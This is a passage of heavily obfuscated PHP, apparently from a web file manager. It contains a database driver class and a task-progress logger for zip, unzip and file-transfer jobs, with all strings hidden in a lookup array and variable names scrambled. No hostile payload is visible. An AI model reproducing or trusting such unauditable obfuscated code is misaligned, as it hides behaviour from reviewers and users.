return !1; } } return !0; } private function getAll() { $øìåŸ¿ú = array(); if ($this->numRows > 0) { for ($Ş·Í—¼¶ = 0; $Ş·Í—¼¶ < $this->numRows; $Ş·Í—¼¶++) { $øìåŸ¿ú[$Ş·Í—¼¶] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $øìåŸ¿ú; } public function getFields($°Š½áÑ¹) { $‚õõÁ«” =& $_SERVER[ìïæ“œî]; $­Î‚ôˆâ = $this->query($‚õõÁ«”[952] . $this->parseKey($°Š½áÑ¹)); $óƒ×†œ = array(); if ($­Î‚ôˆâ) { foreach ($­Î‚ôˆâ as $”àïÈ™™ => $«˜ì‹û«) { $óƒ×†œ[$«˜ì‹û«[$‚õõÁ«”[31]]] = array($‚õõÁ«”[32] => $«˜ì‹û«[$‚õõÁ«”[31]], $‚õõÁ«”[33] => $«˜ì‹û«[$‚õõÁ«”[34]], $‚õõÁ«”[35] => (bool) ($«˜ì‹û«[$‚õõÁ«”[36]] === $‚õõÁ«”[12]), $‚õõÁ«”[37] => $«˜ì‹û«[$‚õõÁ«”[38]], $‚õõÁ«”[39] => strtolower($«˜ì‹û«[$‚õõÁ«”[40]]) == $‚õõÁ«”[41], $‚õõÁ«”[42] => strtolower($«˜ì‹û«[$‚õõÁ«”[43]]) == $‚õõÁ«”[44]); } } return $óƒ×†œ; } public function getTables($Ó“¢¼”» = '') { $¹ãÎÖˆ€ =& $_SERVER[ìïæ“œî]; $¦‡îØ× = !empty($Ó“¢¼”») ? $¹ãÎÖˆ€[954] . $Ó“¢¼”» . $¹ãÎÖˆ€[955] : $¹ãÎÖˆ€[956]; $’Åøò³ = $this->query($¦‡îØ×); $„š½ƒ­Û = array(); if ($’Åøò³) { foreach ($’Åøò³ as $ÕæËŸşÔ => $Ó ì¬É”) { $„š½ƒ­Û[$ÕæËŸşÔ] = current($Ó ì¬É”); } } return $„š½ƒ­Û; } public function replace($¥×Îõ‡Ì, $—èŞÇ‘Õ = array()) { $¼–Öƒ‘­ =& $_SERVER[ìïæ“œî]; foreach ($¥×Îõ‡Ì as $şØª°ª¤ => $¯ûš¿·â) { $¶ÏşÍù° = $this->parseValue($¯ûš¿·â); if (is_scalar($¶ÏşÍù°)) { $öÇìüú»[] = $¶ÏşÍù°; $™øó’–…[] = $this->parseKey($şØª°ª¤); } } $ÉÛ§ó§‹ = $¼–Öƒ‘­[957] . $this->parseTable($—èŞÇ‘Õ[$¼–Öƒ‘­[356]]) . $¼–Öƒ‘­[958] . implode($¼–Öƒ‘­[50], $™øó’–…) . $¼–Öƒ‘­[959] . implode($¼–Öƒ‘­[50], $öÇìüú») . $¼–Öƒ‘­[960]; return $this->execute($ÉÛ§ó§‹); } public function insertAll($Ëß‡„ÏÇ, $ğâ­÷ª× = array(), $Ù÷Ôøò = false) { $‰èœ§É¬ =& $_SERVER[ìïæ“œî]; if (!is_array($Ëß‡„ÏÇ[0])) { return !1; } $ş„êÉÚ÷ = array_keys($Ëß‡„ÏÇ[0]); $Ï‘‚µñğ = array(); foreach ($Ëß‡„ÏÇ as $Í»§¹±Û) { $ÄÈ¾¨±§ = array(); foreach ($Í»§¹±Û as $²ÙÇïæï => $üû¨ğœ) { $üû¨ğœ = $this->parseValue($üû¨ğœ); if (is_scalar($üû¨ğœ)) { $ÄÈ¾¨±§[] = $üû¨ğœ; } } $Ï‘‚µñğ[] = $‰èœ§É¬[337] . implode($‰èœ§É¬[50], $ÄÈ¾¨±§) . $‰èœ§É¬[960]; } array_walk($ş„êÉÚ÷, array($this, $‰èœ§É¬[961])); $·•ùñÜ× = $Ù÷Ôøò ? $‰èœ§É¬[962] : $‰èœ§É¬[963]; $ûÕ¯Ï”ş = $·•ùñÜ× . $‰èœ§É¬[964] . $this->parseTable($ğâ­÷ª×[$‰èœ§É¬[356]]) . $‰èœ§É¬[958] . implode($‰èœ§É¬[50], $ş„êÉÚ÷) . $‰èœ§É¬[965] . implode($‰èœ§É¬[50], $Ï‘‚µñğ); return $this->execute($ûÕ¯Ï”ş); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¤ô“üÜß =& $_SERVER[ìïæ“œî]; $this->error = $this->_linkID->errno . $¤ô“üÜß[4] . $this->_linkID->error; if ($¤ô“üÜß[12] != $this->queryStr) { $this->error .= LNG($¤ô“üÜß[48]) . $this->queryStr; } think_trace($this->error, $¤ô“üÜß[12], $¤ô“üÜß[49]); return $this->error; } public function escapeString($ªºÏ¾‘) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ªºÏ¾‘); } else { return addslashes($ªºÏ¾‘); } } public function parseKey(&$Úí€€×, $¢÷¨ûüÚ = true) { $ôû˜ÖÚ› =& $_SERVER[ìïæ“œî]; if ($¢÷¨ûüÚ) { $Úí€€× = $this->parseKeyCheck($Úí€€×); } if ($Úí€€× != $ôû˜ÖÚ›[220] && !preg_match($ôû˜ÖÚ›[966], $Úí€€×)) { $Úí€€× = $ôû˜ÖÚ›[461] . trim($Úí€€×, $ôû˜ÖÚ›[461]) . $ôû˜ÖÚ›[461]; } return $Úí€€×; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($£šş“ş = '') { $”ØìµŠÛ =& $_SERVER[ìïæ“œî]; if (!class_exists($”ØìµŠÛ[969])) { think_exception(think_lang($”ØìµŠÛ[14]) . $”ØìµŠÛ[970]); } if (!empty($£šş“ş)) { $this->config = $£šş“ş; if (empty($this->config[$”ØìµŠÛ[17]])) { $this->config[$”ØìµŠÛ[17]] = array(); } } } public function connect($Şâ›ƒ¸Ì = '', $İŒÛ¡ºê = 0) { $ñşéÅå½ =& $_SERVER[ìïæ“œî]; if (!isset($this->linkID[$İŒÛ¡ºê])) { if (empty($Şâ›ƒ¸Ì)) { $Şâ›ƒ¸Ì = $this->config; } $»•˜ºù­ = !empty($Şâ›ƒ¸Ì[$ñşéÅå½[17]][$ñşéÅå½[18]]) ? $Şâ›ƒ¸Ì[$ñşéÅå½[17]][$ñşéÅå½[18]] : $this->pconnect; if ($»•˜ºù­) { $Şâ›ƒ¸Ì[$ñşéÅå½[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$İŒÛ¡ºê] = new PDO($Şâ›ƒ¸Ì[$ñşéÅå½[971]], $Şâ›ƒ¸Ì[$ñşéÅå½[943]], $Şâ›ƒ¸Ì[$ñşéÅå½[944]], $Şâ›ƒ¸Ì[$ñşéÅå½[17]]); } catch (PDOException $ŸÃ²Áé) { think_exception($ŸÃ²Áé->getMessage()); } $this->dbType = $this->_getDsnType($Şâ›ƒ¸Ì[$ñşéÅå½[971]]); if (in_array($this->dbType, array($ñşéÅå½[972], $ñşéÅå½[973], $ñşéÅå½[974], $ñşéÅå½[975]))) { think_exception($ñşéÅå½[976] . $this->dbType . $ñşéÅå½[977] . $this->dbType . $ñşéÅå½[978]); } if (!$this->linkID[$İŒÛ¡ºê]) { think_exception($ñşéÅå½[979]); } try { $this->linkID[$İŒÛ¡ºê]->exec($ñşéÅå½[980] . think_config($ñşéÅå½[946])); } catch (Exception $ŸÃ²Áé) { } $this->connected = !0; if (1 != think_config($ñşéÅå½[22])) { unset($this->config); } } return $this->linkID[$İŒÛ¡ºê]; } public function free() { $this->PDOStatement = null; } public function query($µç¸†À, $±ŸôÅ¨Ò = array()) { $ºÑÛşµĞ =& $_SERVER[ìïæ“œî]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $µç¸†À; if (!empty($±ŸôÅ¨Ò)) { $this->queryStr .= $ºÑÛşµĞ[981] . print_r($±ŸôÅ¨Ò, !0) . $ºÑÛşµĞ[982]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ºÑÛşµĞ[23], 1); think_status($ºÑÛşµĞ[24]); $this->PDOStatement = $this->_linkID->prepare($µç¸†À); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¸¢‡Ô = $this->PDOStatement->execute($±ŸôÅ¨Ò); $this->debug(); if (!1 === $¸¢‡Ô) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ñâ™À…¿, $í—ï²±Í = array()) { $ µñ‰¿ =& $_SERVER[ìïæ“œî]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ñâ™À…¿; if (!empty($í—ï²±Í)) { $this->queryStr .= $ µñ‰¿[981] . print_r($í—ï²±Í, !0) . $ µñ‰¿[982]; } $û§ÜÕÁ§ = !1; if ($this->dbType == $ µñ‰¿[975]) { if (preg_match($ µñ‰¿[983], $this->queryStr, $–­ßïò)) { $this->table = think_config($ µñ‰¿[984]) . str_ireplace(think_config($ µñ‰¿[985]), $ µñ‰¿[454], $–­ßïò[2]); $û§ÜÕÁ§ = (bool) $this->query($ µñ‰¿[986] . strtoupper($this->table) . $ µñ‰¿[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ µñ‰¿[25], 1); think_status($ µñ‰¿[24]); $this->PDOStatement = $this->_linkID->prepare($Ñâ™À…¿); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $’á¾’êÌ = $this->PDOStatement->execute($í—ï²±Í); $this->debug(); if (!1 === $’á¾’êÌ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($û§ÜÕÁ§ || preg_match($ µñ‰¿[987], $Ñâ™À…¿)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¿÷ëç¼Å = $this->_linkID->commit(); $this->transTimes = 0; if (!$¿÷ëç¼Å) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $İıÁŒÜ€ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$İıÁŒÜ€) { $this->error(); return !1; } } return !0; } private function getAll() { $ÃıäòÊÜ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÃıäòÊÜ); return $ÃıäòÊÜ; } public function getFields($£“é­§Ù) { $Š¥Æ®Ş• =& $_SERVER[ìïæ“œî]; $this->initConnect(!0); if (think_config($Š¥Æ®Ş•[988])) { $¢ŞÜ”çÂ = str_replace($Š¥Æ®Ş•[989], $£“é­§Ù, think_config($Š¥Æ®Ş•[988])); } else { switch ($this->dbType) { case $Š¥Æ®Ş•[972]: case $Š¥Æ®Ş•[990]: $¢ŞÜ”çÂ = "\x53\105\114\105\x43\x54\40\x20\40\x63\x6f\x6c\165\155\x6e\x5f\x6e\x61\x6d\145\40\141\163\x20\x27\x4e\x61\x6d\x65\47\x2c\x20\x20\40\144\141\164\x61\x5f\164\171\160\145\x20\x61\163\40\x27\124\x79\x70\x65\x27\x2c\40\x20\40\x63\x6f\x6c\x75\x6d\156\137\x64\145\146\141\x75\x6c\x74\x20\x61\163\40\47\x44\x65\x66\141\165\x6c\x74\x27\x2c\x20\40\40\151\x73\137\x6e\165\x6c\x6c\x61\142\154\x65\40\141\163\x20\x27\116\x75\x6c\x6c\x27\xa\x9\x9\106\x52\x4f\115\11\x69\x6e\146\157\162\155\x61\x74\x69\157\156\x5f\163\143\x68\x65\155\x61\x2e\x74\x61\x62\154\x65\163\40\101\x53\40\164\xa\11\x9\112\117\x49\116\x9\151\156\146\x6f\162\x6d\141\x74\151\157\x6e\137\163\x63\x68\145\155\141\x2e\143\157\x6c\x75\x6d\156\x73\40\101\123\40\x63\xa\11\11\x4f\116\40\x20\164\x2e\164\141\142\x6c\145\x5f\x63\141\164\x61\x6c\x6f\x67\40\75\x20\143\x2e\164\x61\x62\154\145\137\x63\141\164\x61\x6c\x6f\147\12\11\x9\101\116\x44\x20\164\56\164\141\142\154\x65\137\163\143\150\145\155\141\x20\x3d\40\x63\x2e\164\141\x62\154\145\137\163\x63\x68\145\155\141\xa\11\11\101\x4e\x44\x20\x74\x2e\x74\141\142\154\145\x5f\x6e\x61\155\145\x20\x3d\x20\143\x2e\x74\x61\x62\x6c\145\137\x6e\x61\x6d\x65\xa\x9\x9\x57\110\105\x52\105\x20\40\40\x74\56\164\x61\x62\154\x65\137\156\141\x6d\x65\x20\75\40\47{$£“é­§Ù}\47"; break; case $Š¥Æ®Ş•[991]: $¢ŞÜ”çÂ = $Š¥Æ®Ş•[992] . $£“é­§Ù . $Š¥Æ®Ş•[993]; break; case $Š¥Æ®Ş•[973]: case $Š¥Æ®Ş•[975]: $¢ŞÜ”çÂ = $Š¥Æ®Ş•[994] . $Š¥Æ®Ş•[995] . $Š¥Æ®Ş•[996] . strtoupper($£“é­§Ù) . $Š¥Æ®Ş•[997] . strtoupper($£“é­§Ù) . $Š¥Æ®Ş•[998]; break; case $Š¥Æ®Ş•[999]: $¢ŞÜ”çÂ = $Š¥Æ®Ş•[1000] . $£“é­§Ù . $Š¥Æ®Ş•[1001]; break; case $Š¥Æ®Ş•[974]: break; case $Š¥Æ®Ş•[1002]: default: $¢ŞÜ”çÂ = $Š¥Æ®Ş•[1003] . ($this->dbType == $Š¥Æ®Ş•[1002] ? "\140{$£“é­§Ù}\x60" : $£“é­§Ù); } } $Ì‰¢ú»‰ = $this->query($¢ŞÜ”çÂ); $¹ÌåØñ = array(); if ($Ì‰¢ú»‰) { foreach ($Ì‰¢ú»‰ as $¦şæÑÆ => $ÙÏ¡¿½Ç) { $ÙÏ¡¿½Ç = array_change_key_case($ÙÏ¡¿½Ç); $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[32]] = isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[32]]) ? $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[32]] : $Š¥Æ®Ş•[454]; $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[33]] = isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[33]]) ? $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[33]] : $Š¥Æ®Ş•[454]; $™ÑØÔè÷ = isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[350]]) ? $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[350]] : $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[32]]; $¹ÌåØñ[$™ÑØÔè÷] = array($Š¥Æ®Ş•[32] => $™ÑØÔè÷, $Š¥Æ®Ş•[33] => $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[33]], $Š¥Æ®Ş•[35] => (bool) (isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[106]]) && $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[106]] === $Š¥Æ®Ş•[12] || isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[35]]) && $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[35]] === $Š¥Æ®Ş•[12]), $Š¥Æ®Ş•[37] => isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[37]]) ? $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[37]] : (isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[56]]) ? $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[56]] : $Š¥Æ®Ş•[454]), $Š¥Æ®Ş•[39] => isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[97]]) ? strtolower($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[97]]) == $Š¥Æ®Ş•[41] : (isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[57]]) ? $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[57]] : !1), $Š¥Æ®Ş•[42] => isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[1004]]) ? strtolower($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[1004]]) == $Š¥Æ®Ş•[44] : (isset($ÙÏ¡¿½Ç[$Š¥Æ®Ş•[97]]) ? $ÙÏ¡¿½Ç[$Š¥Æ®Ş•[97]] : !1)); } } return $¹ÌåØñ; } public function getTables($ÆğÙ¯Ÿ‰ = '') { $³áİŞß¯ =& $_SERVER[ìïæ“œî]; if (think_config($³áİŞß¯[1005])) { $¶øİ²Ê³ = str_replace($³áİŞß¯[1006], $ÆğÙ¯Ÿ‰, think_config($³áİŞß¯[1005])); } else { switch ($this->dbType) { case $³áİŞß¯[973]: case $³áİŞß¯[975]: $¶øİ²Ê³ = $³áİŞß¯[1007]; break; case $³áİŞß¯[972]: case $³áİŞß¯[990]: $¶øİ²Ê³ = $³áİŞß¯[1008]; break; case $³áİŞß¯[999]: $¶øİ²Ê³ = $³áİŞß¯[1009]; break; case $³áİŞß¯[974]: think_exception(think_lang($³áİŞß¯[1010]) . $³áİŞß¯[1011]); break; case $³áİŞß¯[991]: $¶øİ²Ê³ = $³áİŞß¯[45] . $³áİŞß¯[46] . $³áİŞß¯[47]; break; case $³áİŞß¯[1002]: default: if (!empty($ÆğÙ¯Ÿ‰)) { $¶øİ²Ê³ = $³áİŞß¯[954] . $ÆğÙ¯Ÿ‰ . $³áİŞß¯[955]; } else { $¶øİ²Ê³ = $³áİŞß¯[956]; } } } $Šìßçˆ = $this->query($¶øİ²Ê³); $—İ‡İõæ = array(); foreach ($Šìßçˆ as $Á˜÷‚™ => $èÍ‚®û¾) { $—İ‡İõæ[$Á˜÷‚™] = current($èÍ‚®û¾); } return $—İ‡İõæ; } protected function parseLimit($Å•¨ãôÓ) { $ä«ûê› =& $_SERVER[ìïæ“œî]; $€½­ğô• = $ä«ûê›[12]; if (!empty($Å•¨ãôÓ)) { switch ($this->dbType) { case $ä«ûê›[999]: case $ä«ûê›[991]: $Å•¨ãôÓ = explode($ä«ûê›[50], $Å•¨ãôÓ); if (count($Å•¨ãôÓ) > 1) { $€½­ğô• .= $ä«ûê›[51] . $Å•¨ãôÓ[1] . $ä«ûê›[52] . $Å•¨ãôÓ[0] . $ä«ûê›[53]; } else { $€½­ğô• .= $ä«ûê›[51] . $Å•¨ãôÓ[0] . $ä«ûê›[53]; } break; case $ä«ûê›[972]: case $ä«ûê›[990]: break; case $ä«ûê›[974]: break; case $ä«ûê›[973]: case $ä«ûê›[975]: break; case $ä«ûê›[1002]: default: $€½­ğô• .= $ä«ûê›[51] . $Å•¨ãôÓ . $ä«ûê›[53]; } } return $€½­ğô•; } public function parseKey(&$¿”·è¾á, $ÔÚ—ª‡½ = true) { $ÏĞÛ¨¦ =& $_SERVER[ìïæ“œî]; if ($ÔÚ—ª‡½) { $¿”·è¾á = $this->parseKeyCheck($¿”·è¾á); } if ($this->dbType == $ÏĞÛ¨¦[1002]) { if ($¿”·è¾á != $ÏĞÛ¨¦[220] && !preg_match($ÏĞÛ¨¦[966], $¿”·è¾á)) { $¿”·è¾á = $ÏĞÛ¨¦[461] . trim($¿”·è¾á, $ÏĞÛ¨¦[461]) . $ÏĞÛ¨¦[461]; } return $¿”·è¾á; } else { return parent::parseKey($¿”·è¾á, $ÔÚ—ª‡½); } } public function close() { $this->_linkID = null; } public function error() { $È®ı» =& $_SERVER[ìïæ“œî]; if ($this->PDOStatement) { $„·£˜¡ = $this->PDOStatement->errorInfo(); $this->error = $„·£˜¡[1] . $È®ı»[4] . $„·£˜¡[2]; } else { $this->error = $È®ı»[12]; } if ($È®ı»[12] != $this->queryStr) { $this->error .= LNG($È®ı»[48]) . $this->queryStr; } think_trace($this->error, $È®ı»[12], $È®ı»[49]); return $this->error; } public function escapeString($êÆˆêÑá) { $ˆóà¹ =& $_SERVER[ìïæ“œî]; switch ($this->dbType) { case $ˆóà¹[999]: case $ˆóà¹[972]: case $ˆóà¹[990]: case $ˆóà¹[1002]: return addslashes($êÆˆêÑá); case $ˆóà¹[974]: case $ˆóà¹[991]: case $ˆóà¹[973]: case $ˆóà¹[975]: return str_ireplace($ˆóà¹[58], $ˆóà¹[59], $êÆˆêÑá); } } protected function parseValue($©ıê²‰Û) { $ùÛúîöü =& $_SERVER[ìïæ“œî]; if (is_string($©ıê²‰Û)) { $‰»Áá—¨ = strpos($©ıê²‰Û, $ùÛúîöü[4]) === 0 && in_array($©ıê²‰Û, array_keys($this->bind)); $©ıê²‰Û = $‰»Áá—¨ ? $this->escapeString($©ıê²‰Û) : $ùÛúîöü[1012] . $this->escapeString($©ıê²‰Û) . $ùÛúîöü[1012]; } elseif (isset($©ıê²‰Û[0]) && is_string($©ıê²‰Û[0]) && strtolower($©ıê²‰Û[0]) == $ùÛúîöü[373]) { $©ıê²‰Û = $this->escapeString($©ıê²‰Û[1]); } elseif (is_array($©ıê²‰Û)) { $©ıê²‰Û = array_map(array($this, $ùÛúîöü[1013]), $©ıê²‰Û); } elseif (is_bool($©ıê²‰Û)) { $©ıê²‰Û = $©ıê²‰Û ? $ùÛúîöü[91] : $ùÛúîöü[228]; } elseif (is_null($©ıê²‰Û)) { $©ıê²‰Û = $ùÛúîöü[106]; } return $©ıê²‰Û; } public function getLastInsertId() { $Ó÷ö‡àã =& $_SERVER[ìïæ“œî]; switch ($this->dbType) { case $Ó÷ö‡àã[999]: case $Ó÷ö‡àã[991]: case $Ó÷ö‡àã[972]: case $Ó÷ö‡àã[990]: case $Ó÷ö‡àã[974]: case $Ó÷ö‡àã[1002]: return $this->_linkID->lastInsertId(); case $Ó÷ö‡àã[973]: case $Ó÷ö‡àã[975]: $´ÚÃğš® = $this->table; $å–ÂÊœÜ = $this->query("\123\x45\x4c\105\103\124\40{$´ÚÃğš®}\x2e\x63\165\162\x72\x76\141\x6c\x20\143\x75\162\162\166\x61\x6c\x20\106\122\x4f\115\x20\144\x75\141\154"); return $å–ÂÊœÜ ? $å–ÂÊœÜ[0][$Ó÷ö‡àã[1014]] : 0; } } } goto bÏŠ¡ŒÛÀÁ; fˆò×”Æ¡ö: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($İ’¾¸°, $ƒ÷âƒ = '', $Òåšğß¿ = 0, $œÛ›­ˆ’ = '') { $Ë×«÷Ü‚ =& $_SERVER[ìïæ“œî]; $œÛ›­ˆ’ = $œÛ›­ˆ’ ? $œÛ›­ˆ’ : ($ƒ÷âƒ ? $ƒ÷âƒ : $İ’¾¸°); $¨ óûó™ = new Task($İ’¾¸°, $ƒ÷âƒ, $Òåšğß¿, $œÛ›­ˆ’); $GLOBALS[$Ë×«÷Ü‚[1830] . $İ’¾¸°] = new TaskLog($Ë×«÷Ü‚[1731], $¨ óûó™, $œÛ›­ˆ’); return $¨ óûó™; } public function __construct($¨œşëÎó = '', $¸ªµŞ¸ = '', $Ûø¯‡Äõ = '') { $ò¨èêÒ =& $_SERVER[ìïæ“œî]; if (!$¨œşëÎó) { $¨œşëÎó = $ò¨èêÒ[1731]; } $ö´”¯Şà = $¨œşëÎó . $ò¨èêÒ[462] . rand_string(10); if (!$Ûø¯‡Äõ) { $Ûø¯‡Äõ = $¨œşëÎó . $ò¨èêÒ[53] . $Ûø¯‡Äõ; } switch ($¨œşëÎó) { case $ò¨èêÒ[1731]: if (!$¸ªµŞ¸ || !$¸ªµŞ¸->task) { return echoLog($¨œşëÎó . $ò¨èêÒ[1831]); } $æ»ï·‚Í = $¸ªµŞ¸; $ö´”¯Şà = $æ»ï·‚Í->task[$ò¨èêÒ[475]]; $¨œşëÎó = $æ»ï·‚Í->task[$ò¨èêÒ[475]]; if (!$æ»ï·‚Í->task[$ò¨èêÒ[1636]]) { $æ»ï·‚Í->task[$ò¨èêÒ[1636]] = $Ûø¯‡Äõ ? $Ûø¯‡Äõ : $¨œşëÎó; } break; case $ò¨èêÒ[1832]: if (!$¸ªµŞ¸) { return echoLog($¨œşëÎó . $ò¨èêÒ[1833]); } $·¢ÄÚ´ë = is_string($¸ªµŞ¸) ? array($¸ªµŞ¸) : $¸ªµŞ¸; $æ»ï·‚Í = new TaskFileTransfer($ö´”¯Şà, $¨œşëÎó, 0, $Ûø¯‡Äõ ? $Ûø¯‡Äõ : $·¢ÄÚ´ë[0]); foreach ($·¢ÄÚ´ë as $Œô–¯ÕÁ) { $æ»ï·‚Í->addPath($Œô–¯ÕÁ); } break; case $ò¨èêÒ[389]: if (!$¸ªµŞ¸) { return echoLog($¨œşëÎó . $ò¨èêÒ[1833]); } $·¢ÄÚ´ë = is_string($¸ªµŞ¸) ? array($¸ªµŞ¸) : $¸ªµŞ¸; $æ»ï·‚Í = new TaskZip($ö´”¯Şà, $¨œşëÎó, 0, $Ûø¯‡Äõ ? $Ûø¯‡Äõ : $·¢ÄÚ´ë[0]); foreach ($·¢ÄÚ´ë as $Œô–¯ÕÁ) { $æ»ï·‚Í->addPath($Œô–¯ÕÁ); } break; case $ò¨èêÒ[1276]: if (!$¸ªµŞ¸) { return echoLog($¨œşëÎó . $ò¨èêÒ[1833]); } $æ»ï·‚Í = new TaskUnZip($ö´”¯Şà, $¨œşëÎó, 0, $Ûø¯‡Äõ ? $Ûø¯‡Äõ : $¸ªµŞ¸); if ($¸ªµŞ¸) { $æ»ï·‚Í->addFile($¸ªµŞ¸); } break; case $ò¨èêÒ[152]: $æ»ï·‚Í = new TaskHttp($ö´”¯Şà, $¨œşëÎó); break; default: return; break; } $this->task = $æ»ï·‚Í; $this->taskID = $ö´”¯Şà; Hook::bind($ò¨èêÒ[1768], array($this, $ò¨èêÒ[1834])); Hook::bind($ò¨èêÒ[1770], array($this, $ò¨èêÒ[1835])); Hook::bind($ò¨èêÒ[1764], array($this, $ò¨èêÒ[1836])); echoLog($ò¨èêÒ[1837] . $æ»ï·‚Í->task[$ò¨èêÒ[1636]]); } public function __destruct() { $this->end(); } public function end($ØÚÑ×‚† = '') { $…ù°¨§Ù =& $_SERVER[ìïæ“œî]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ØÚÑ×‚†); $this->task = !1; $this->taskID = !1; Hook::unbind($…ù°¨§Ù[1768], array($this, $…ù°¨§Ù[1834])); Hook::unbind($…ù°¨§Ù[1770], array($this, $…ù°¨§Ù[1835])); Hook::unbind($…ù°¨§Ù[1764], array($this, $…ù°¨§Ù[1836])); } public function taskUpdate($±ÔÚûü ) { $£Å¥—¹¤ =& $_SERVER[ìïæ“œî]; if (!$±ÔÚûü  || $this->taskID != $±ÔÚûü [$£Å¥—¹¤[475]]) { return; } $Ù€÷Àã‚ = 20; $ØºÍÙ¨Œ = intval($±ÔÚûü [$£Å¥—¹¤[1749]] * $Ù€÷Àã‚); $ÁíÖ‰Ô = $£Å¥—¹¤[176] . str_repeat($£Å¥—¹¤[939], $ØºÍÙ¨Œ) . $£Å¥—¹¤[1069] . str_repeat($£Å¥—¹¤[53], $Ù€÷Àã‚ - $ØºÍÙ¨Œ) . $£Å¥—¹¤[178]; $¡ÍÃéŞĞ = $ÁíÖ‰Ô . sprintf($£Å¥—¹¤[1838], $±ÔÚûü [$£Å¥—¹¤[1749]] * 100) . $£Å¥—¹¤[1839]; $ùĞ”½û = $¡ÍÃéŞĞ . $±ÔÚûü [$£Å¥—¹¤[1748]] . $£Å¥—¹¤[8] . $±ÔÚûü [$£Å¥—¹¤[1118]] . LNG($£Å¥—¹¤[1840]); $ø–É„Õ = $£Å¥—¹¤[12]; if ($±ÔÚûü [$£Å¥—¹¤[1824]]) { $ùĞ”½û = $¡ÍÃéŞĞ . size_format($±ÔÚûü [$£Å¥—¹¤[1748]]) . $£Å¥—¹¤[8] . size_format($±ÔÚûü [$£Å¥—¹¤[1118]]); $ø–É„Õ = size_format($±ÔÚûü [$£Å¥—¹¤[1750]]) . $£Å¥—¹¤[1841]; } if ($±ÔÚûü [$£Å¥—¹¤[1120]]) { $±ÔÚûü [$£Å¥—¹¤[1798]] = $±ÔÚûü [$£Å¥—¹¤[1120]] . $£Å¥—¹¤[53] . $±ÔÚûü [$£Å¥—¹¤[1798]]; } if ($±ÔÚûü [$£Å¥—¹¤[1798]]) { $»„Á¸Ø = $£Å¥—¹¤[12]; if ($±ÔÚûü [$£Å¥—¹¤[1800]]) { $»„Á¸Ø = $£Å¥—¹¤[50] . size_format($±ÔÚûü [$£Å¥—¹¤[1801]]) . $£Å¥—¹¤[8] . size_format($±ÔÚûü [$£Å¥—¹¤[1800]]); } $ø–É„Õ .= $±ÔÚûü [$£Å¥—¹¤[1798]] . $»„Á¸Ø; } if ($±ÔÚûü [$£Å¥—¹¤[812]] && !$±ÔÚûü [$£Å¥—¹¤[1800]]) { $ø–É„Õ .= $£Å¥—¹¤[53] . size_format($±ÔÚûü [$£Å¥—¹¤[1805]]) . $£Å¥—¹¤[8] . size_format($±ÔÚûü [$£Å¥—¹¤[812]]); } echoLog($ùĞ”½û . $£Å¥—¹¤[53] . $ø–É„Õ, !0); } public function taskEnd($­ä£óÇÄ) { $« š‰˜ =& $_SERVER[ìïæ“œî]; if (!$­ä£óÇÄ || $this->taskID != $­ä£óÇÄ[$« š‰˜[475]]) { return; } $øœŒÂÜÀ = $­ä£óÇÄ ? $­ä£óÇÄ[$« š‰˜[1748]] . $« š‰˜[8] . $­ä£óÇÄ[$« š‰˜[1118]] . LNG($« š‰˜[1840]) . $« š‰˜[74] : $« š‰˜[12]; echoLog($« š‰˜[1842] . $­ä£óÇÄ[$« š‰˜[1636]] . ($­ä£óÇÄ[$« š‰˜[526]] ? $« š‰˜[74] . $­ä£óÇÄ[$« š‰˜[526]] : $« š‰˜[12]) . $« š‰˜[74] . $øœŒÂÜÀ . $« š‰˜[1843] . sprintf($« š‰˜[899], timeFloat() - $­ä£óÇÄ[$« š‰˜[1751]]) . $« š‰˜[1763]); $this->end(); } public function taskKill($·ñ÷ûê¼) { $™Õ×Ú© =& $_SERVER[ìïæ“œî]; if (!$·ñ÷ûê¼ || $this->taskID != $·ñ÷ûê¼[$™Õ×Ú©[475]]) { return; } echoLog($™Õ×Ú©[1844] . 